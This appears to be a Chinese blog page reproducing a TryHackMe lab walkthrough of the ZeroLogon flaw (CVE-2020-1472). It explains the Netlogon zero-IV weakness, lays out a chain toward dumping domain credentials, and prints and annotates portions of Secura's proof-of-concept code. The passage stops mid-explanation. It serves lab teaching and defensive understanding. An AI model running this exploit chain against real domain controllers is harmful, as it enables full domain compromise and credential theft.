@@ -1,0 +1,450 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMZeroLogon | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="The Zero Day Angle这个房间的目的是以教育为重点阐明 ZeroLogon 漏洞。这样做是为了让防御者更好地理解这里面临的威胁。ZeroLogon 漏洞是从“概念验证”的角度来探讨的，提供了此问题中易受攻击的方法的细分。TryHackMe 不会容忍个人采取的非法行动。 关于漏洞 9 月 14 日，Secura 发布了 CVE-2020-1472 的白皮书，允许攻击者在大约一分钟内从零">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMZeroLogon">
+<meta property="og:url" content="http://mikannse.space/2024/04/30/THMZeroLogon/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="The Zero Day Angle这个房间的目的是以教育为重点阐明 ZeroLogon 漏洞。这样做是为了让防御者更好地理解这里面临的威胁。ZeroLogon 漏洞是从“概念验证”的角度来探讨的，提供了此问题中易受攻击的方法的细分。TryHackMe 不会容忍个人采取的非法行动。 关于漏洞 9 月 14 日，Secura 发布了 CVE-2020-1472 的白皮书，允许攻击者在大约一分钟内从零">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-04-30T01:18:10.000Z">
+<meta property="article:modified_time" content="2024-07-14T13:02:24.035Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="Domain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/30/THMZeroLogon/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMZeroLogon',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-07-14 21:02:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMZeroLogon</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-30T01:18:10.000Z" title="发表于 2024-04-30 09:18:10">2024-04-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-14T13:02:24.035Z" title="更新于 2024-07-14 21:02:24">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMZeroLogon"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="The-Zero-Day-Angle"><a href="#The-Zero-Day-Angle" class="headerlink" title="The Zero Day Angle"></a>The Zero Day Angle</h1><p>这个房间的目的是以教育为重点阐明 ZeroLogon 漏洞。这样做是为了让防御者更好地理解这里面临的威胁。ZeroLogon 漏洞是从“概念验证”的角度来探讨的，提供了此问题中易受攻击的方法的细分。TryHackMe 不会容忍个人采取的非法行动。</p>
+<p><strong>关于漏洞</strong></p>
+<p>9 月 14 日，Secura 发布了 CVE-2020-1472 的白皮书，允许攻击者在大约一分钟内从零变为域管理员。他们将此漏洞称为零登录。</p>
+<p>零登录是一种纯粹基于统计的攻击，它滥用了 MS-NRPC（Microsoft NetLogon 远程协议）中的一项功能，MS-NRPC 是 Active Directory 的一个关键身份验证组件，用于处理用户和机器帐户的身份验证。简而言之——攻击主要集中在加密的不良实现上。更具体地说，微软选择对 ComputeNetlogonCredential 函数使用 AES-CFB8，这通常没问题，只是他们硬编码了初始化向量以使用全零而不是随机字符串。当攻击者发送仅包含零且 IV 为零的消息时，密文为零的概率为 1/256。</p>
+<p>但这对我们有什么用呢？我们将在以下部分中讨论这一点。</p>
+<p> <strong>关于机器帐户</strong></p>
+<p>通常，如果我们尝试对任何用户帐户进行基于统计的攻击，我们都会被锁定。如果我们将此原则应用于机器帐户，情况并非如此。机器帐户的行为方式与标准用户帐户大不相同。它们没有预定义的帐户锁定尝试，因为通常使用 64 个以上的字符字母数字密码来保护它们，这使得它们很难被破解。它们绝不供最终用户访问。在某些情况下，我们可以使用 Mimikatz 之类的工具转储机器帐户密码，但如果我们到了那个地步，我们已经入侵了机器——我们正在寻找域内的持久性，而不是横向移动。 </p>
+<p><strong>滥用漏洞</strong></p>
+<p>机器帐户通常拥有系统级权限，我们可以将其用于各种事情。如果您不熟悉 Active Directory，我们可以获取域控制器的机器帐户并尝试结合使用授予的身份验证和 Secretsdump.py（SecretsDump 是一个密码转储实用程序，类似于 Mimikatz，但它位于网络上而不是主机上）转储域内的所有密码。此时，我们开始形成一个粗略的杀伤链：</p>
+<p>使用零登录绕过域控制器机器帐户的身份验证 -&gt; 运行 Secretsdump.py 转储凭据 -&gt; 破解/传递域管理员哈希 -&gt; ??? -&gt; 利润</p>
+<p> <strong>分析 MS-NRPC 登录过程</strong></p>
+<p>此时，我们知道存在漏洞，但我们还不太确定如何利用它。我们很快就会介绍这一点，但我们知道 Microsoft 在 MS-NRPC 的 ComputeNetLogonCredetial 功能中处理身份验证的方式存在漏洞。为了更好地理解这个漏洞，我们需要更深入地研究 Microsoft 如何处理 NRPC 身份验证。为了分析漏洞发生的位置，我们将使用 Secura 提供的图表以及 Microsoft 文档来解密零登录背后的魔力。可以在本任务的底部找到来源。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/9da79dfaa9f0992449089ff8acdb2b8b.png" alt="Zerologon Explained"></p>
+<p> <em>来源：Secura</em></p>
+<p><strong>步骤 1</strong>。客户端创建 NetrServerReqChallenge 并将其发送出去 *[图 1。步骤 1]*。它包含以下值：</p>
+<ol>
+<li>DC</li>
+<li>目标设备（在我们的例子中也是 DC）</li>
+<li>Nonce（在我们的例子中是 16 个字节的零）。</li>
+</ol>
+<p><strong>步骤 2</strong>。服务器接收 NetrServerReqChallenge，然后服务器将生成自己的 Nonce（这称为服务器质询），服务器将发回服务器质询。 <em>[图 1。步骤 2]</em></p>
+<p><strong>步骤 3</strong>。客户端（我们）将使用提供的服务器质询计算其 NetLogon 凭据 *[图 1。步骤 3]*。它使用 NetrServerAuthenticate3 方法，该方法需要以下参数：</p>
+<ol>
+<li><p>自定义绑定句柄（Impacket 会为我们处理此问题，它已事先协商）</p>
+</li>
+<li><p>帐户名称（域控制器的计算机帐户名称。例如：DC01$）</p>
+</li>
+<li><p>安全通道类型（Impacket 会为我们处理此问题，但我们仍需要指定它：[nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel]）</p>
+</li>
+<li><p>计算机名称（域控制器，例如：DC01）</p>
+</li>
+<li><p>客户端凭据字符串（这将是 8 个十六进制的 \x00 [16 个字节的零]）</p>
+</li>
+<li><p>协商标志（从禁用签名/密封标志的 Win10 客户端观察到以下值：0x212fffff，由 Secura 提供）</p>
+</li>
+</ol>
+<p><strong>步骤 4</strong>。服务器将接收 NetrServerAuthenticate 请求，并使用其已知的、正确的值自行计算相同的请求。如果结果正确，服务器将向客户端发送回所需信息。*[图 1。步骤 4。]*</p>
+<p>此时，利用零登录漏洞的尝试正在进行中。上述步骤将循环执行一定次数，以尝试利用零登录漏洞。实际利用发生在步骤 3 和步骤 4，我们希望服务器具有与客户端相同的计算。这就是 1/256 的机会发挥作用的地方。</p>
+<p><strong>步骤 5</strong>。如果服务器计算出相同的值，客户端将重新验证，一旦确认双方一致，他们将就会话密钥达成一致。会话密钥将用于加密客户端和服务器之间的通信，这意味着身份验证成功。*[图 1。步骤 5]*</p>
+<p>从那里，可以进行正常的 RPC 通信。</p>
+<p>​      <strong>Sources</strong></p>
+<ol>
+<li>Tom Tervoort of Secura - <a target="_blank" rel="noopener" href="https://www.secura.com/pathtoimg.php?id=2055">https://www.secura.com/pathtoimg.php?id=2055</a></li>
+<li>Microsoft - <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9</a></li>
+<li>Microsoft - <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9</a></li>
+</ol>
+<h1 id="Impacket-Installation"><a href="#Impacket-Installation" class="headerlink" title="Impacket Installation"></a>Impacket Installation</h1><p><strong>Impacket 安装</strong></p>
+<p>作为预先警告，Impacket 在 nrpc.py 中的某些模块方面可能非常挑剔，因此，我们建议使用 TryHackMe <strong>AttackBox</strong>。这将使漏洞利用运行得更快，此外，我们可以尝试通过 <strong>AttackBox</strong> 提供更好的支持。此外，我们将使用虚拟环境来安装 Impacket。安装 Impacket 的说明如下：</p>
+<p> AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackbox$ python3 -m venv impacketEnv</span><br><span class="line">user@attackbox$ source impacketEnv/bin/activate</span><br><span class="line">user@attackbox$ python3 -m pip install --upgrade pip</span><br><span class="line">user@attackbox$ python3 -m pip install impacket</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行这些命令后，您应该被置于 Python3 虚拟环境中，该环境将兼容修改 PoC 以利用零登录。感谢 <a target="_blank" rel="noopener" href="https://discord.com/invite/tryhackme">TryHackMe Discord</a> 中的 Onurshin 建议使用 Python 虚拟环境。</p>
+<h1 id="The-Proof-of-Concept"><a href="#The-Proof-of-Concept" class="headerlink" title="The Proof of Concept"></a>The Proof of Concept</h1><p><strong>PoC and You</strong></p>
+<p>概念验证对于每个漏洞利用都非常重要，没有它们，漏洞利用几乎完全是理论上的。幸运的是，Secura 能够提供有效的 <a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">零登录概念验证</a>，该验证已完成 90%。我们只需进行一次额外调用即可将密码更改为空值，回想任务 1 中的图 3，Secura 甚至非常友好地为我们提供了需要调用的方法 (<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">NetrServerPasswordSet2</a>)。在 Microsoft 文档中查找该方法，它与 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">hNetSeverAuthenticate3</a> 非常相似，因此我们将重新使用其中的一些相同变量以及结构。 <strong>分析 PoC</strong></p>
+<p>在我们继续之前，您应该从 Secura 下载 PoC，可在此处找到：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py">https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</a></p>
+<p>该脚本乍一看似乎相当令人生畏，但它非常简单，如果您回想任务 1 中的图 1，您很快就会看到它是如何开始组合在一起的。让我们从分解 PoC 开始。我们将按照执行/重要性的顺序进行，以便更容易理解：</p>
+<p>  <strong>Lines 3 - 13</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> nrpc, epm</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dtypes <span class="keyword">import</span> NULL</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> transport</span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> crypto</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hmac, hashlib, struct, sys, socket, time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_call</span><br><span class="line">MAX_ATTEMPTS = <span class="number">2000</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>第 1-4 行从 Impacket 导入所需的模块，特别是 NRPC、EPM、Crypto 和 Transport 库。此外，第 6-8 行还导入了其他一些杂项库，但 Impacket 库才是这里的主角。最后，在第 9 行，我们定义了一个常量（类似于变量，但永远不会改变），将零登录的最大重试次数设置为 2000。</p>
+<p>  <strong>Lines 76 - 86</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">3</span> &lt;= <span class="built_in">len</span>(sys.argv) &lt;= <span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;\n'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Note: dc-name should be the (NetBIOS) computer name of the domain controller.'</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    [_, dc_name, dc_ip] = sys.argv</span><br><span class="line"></span><br><span class="line">    dc_name = dc_name.rstrip(<span class="string">'$'</span>)</span><br><span class="line">    perform_attack(<span class="string">'\\\\'</span> + dc_name, dc_ip, dc_name)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来我们跳到脚本的最底部，以便稍后理解其他一些变量，第 1 行本质上是在 Python 中声明一个主函数，第 2 行我们检查参数数量，并确保它正好是 3（zerologon_tester.py DCNAME IP）。第 3-5 行仅在参数大于 3 个或小于 2 个时打印帮助菜单并退出。如果提供了必需的参数，则在第 8 行将参数传递到两个变量中：dc_name 和 dc_ip。传递参数后，dc_name 将被删除“$”字符，因为 dc_name 变量不应该有它。但是用户帐户名应该有。之后，它将两个变量和一个额外的修改后的变量传递到名为“perform_attack”的模块中。</p>
+<p>  <strong>Lines 57 - 73</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">perform_attack</span>(<span class="params">dc_handle, dc_ip, target_computer</span>):</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">'Performing authentication attempts...'</span>)</span><br><span class="line">  rpc_con = <span class="literal">None</span></span><br><span class="line">  <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, MAX_ATTEMPTS):  </span><br><span class="line">    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)</span><br><span class="line">    <span class="keyword">if</span> rpc_con == <span class="literal">None</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">'='</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> rpc_con:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'\nSuccess! DC can be fully compromised by a Zerologon attack.'</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'\nAttack failed. Target is probably patched.'</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第 1 行定义变量在本地函数中的传递位置，\DCNAME 传递到 dc_handle 变量，dc_ip 传递到 dc_ip 变量，dc_name 传递到 target_computer 变量。所有这些变量将在稍后使用，或传递到不同的模块。第 4 行将变量 rpc_con 设置为 none，这将持续跟踪以检查身份验证是否成功，如果不成功，脚本将继续执行，直到重试次数达到 2000 次。第 5 行是零登录的实际重试以 for 循环的形式发生的地方。第 6 行将 rpc_con 变量设置为另一个名为“try_zero_authenticate”的函数的输出，并向其传递几个变量，具体来说是 dc_handle、dc_ip 和 target_computer。所有这些我们之前都讨论过。接下来的几行只是检查 rpc_con 是否等于无效的登录尝试，如果是，则打印 =，如果不是，则打印成功，如果达到 2000 次重试：打印攻击失败。</p>
+<p>  <strong>Lines 20-25</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">try_zero_authenticate</span>(<span class="params">dc_handle, dc_ip, target_computer</span>):</span><br><span class="line"></span><br><span class="line">  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol=<span class="string">'ncacn_ip_tcp'</span>)</span><br><span class="line">  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()</span><br><span class="line">  rpc_con.connect()</span><br><span class="line">  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第 1 行定义 try_zero_authenticate 函数，并将前面提到的 3 个变量作为输入，并将它们传递到函数中。第 3-6 行通过 TCP/IP 与 NRPC 建立绑定和会话，以便我们可以与域控制器进行通信。</p>
+<p>  <strong>Lines 27-40</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">plaintext = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line">ciphertext = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">flags = <span class="number">0x212fffff</span></span><br><span class="line"></span><br><span class="line">nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + <span class="string">'\x00'</span>, target_computer + <span class="string">'\x00'</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + <span class="string">'\x00'</span>, target_computer + <span class="string">'$\x00'</span>, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + <span class="string">'\x00'</span>, ciphertext, flags)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第 1 行和第 2 行建立了两个新变量，即包含 16 个字节“\x00”的明文和密文，将用于利用零登录漏洞。第 4 行包含一个名为 Flags 的变量。这些是从禁用签名和密封位的 Windows 10 客户端（使用 AES-CFB8）观察到的默认标志（来源/信用：Secura）。第 6 行是有趣的地方——这是图 1 中第 1 步开始的地方，客户端创建一个 NetrServerReqChallenge，其中包含 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32">Microsoft 文档</a> 所需的以下信息：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">NetrServerReqChallenge</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, unique, <span class="built_in">string</span>] LOGONSRV_HANDLE PrimaryName,</span></span><br><span class="line"><span class="params">  [in, <span class="built_in">string</span>] <span class="type">wchar_t</span>* ComputerName,</span></span><br><span class="line"><span class="params">  [in] PNETLOGON_CREDENTIAL ClientChallenge,</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>主名称是 DC 句柄，计算机名称是目标计算机，客户端质询是 16 个字节的“\x00”。客户端将收到返回，这将在图 1 的步骤 2 中使用：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">NetrServerReqChallenge</span><span class="params">(</span></span><br><span class="line"><span class="params">  [out] PNETLOGON_CREDENTIAL ServerChallenge</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第 8 行设置了一个 try except（我们将在接下来的几行中看到其余部分），但第 9 行是我们真正尝试利用零登录漏洞的地方，这将是图 1，步骤 3。本节需要更多信息，根据 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">NetrServerAuthenticate3</a> 的 Microsoft 文档，需要以下内容：</p>
